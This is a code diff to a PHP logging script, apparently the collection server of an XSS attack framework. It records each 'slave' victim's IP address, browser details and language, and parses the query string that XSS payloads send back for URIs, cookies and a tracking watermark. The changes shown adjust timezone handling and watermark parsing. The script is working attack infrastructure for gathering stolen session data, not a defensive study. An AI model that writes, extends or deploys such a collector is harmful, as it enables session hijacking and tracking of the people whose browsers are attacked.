@@ -2,6 +2,10 @@
 // 记录抓取的信息
 // Author: axis
 
+//date_default_timezone_set(date_default_timezone_get());
+date_default_timezone_set('Asia/Shanghai');
+
+
 $fvck="Slave login at: ";
 
 $border = "\r\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n";
@@ -9,7 +13,8 @@ $border = "\r\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 $slaveip = "Slave IP: ".$_SERVER['REMOTE_ADDR'];   //获取IP
 $slaveagent = "Slave User-Agent: ".$_SERVER['HTTP_USER_AGENT'];  // 浏览器和系统版本
 $slavelang = "Slave Lang: ".$_SERVER['HTTP_ACCEPT_LANGUAGE'];  // 语言
-$requestdate = date("m/d/Y H:i:s", $_SERVER['REQUEST_TIME']); //请求时间
+//$requestdate = date("m/d/Y H:i:s", $_SERVER['REQUEST_TIME']); //请求时间
+$requestdate = date("m/d/Y H:i:s"); 
 //$requestdate = date(DATE_RFC822);
 $qstr = $_SERVER['QUERY_STRING'];  // XSS传回的数据
 
@@ -43,9 +48,13 @@ $slavecookiepos = strpos($qstr, "    [**** Cookie");
 $slaveuri = substr($qstr, 0, $slavecookiepos);
 */
 
-// 分离出水印
-$slaveWatermark = strchr($qstr, "[**** Watermark: ");
-$slaveWatermark = strchr($slaveWatermark, "|");
+// 判断水印为null的情况
+$slaveWatermark = strchr($qstr, "[**** Watermark: null");
+if ( $slaveWatermark == false){ // 说明有水印
+  // 分离出水印
+  $slaveWatermark = strchr($qstr, "[**** Watermark: ");
+  $slaveWatermark = strchr($slaveWatermark, "|");
+}
 
 // 如果没有打上水印,则为null,无法找到 "|"
 if ($slaveWatermark != false){
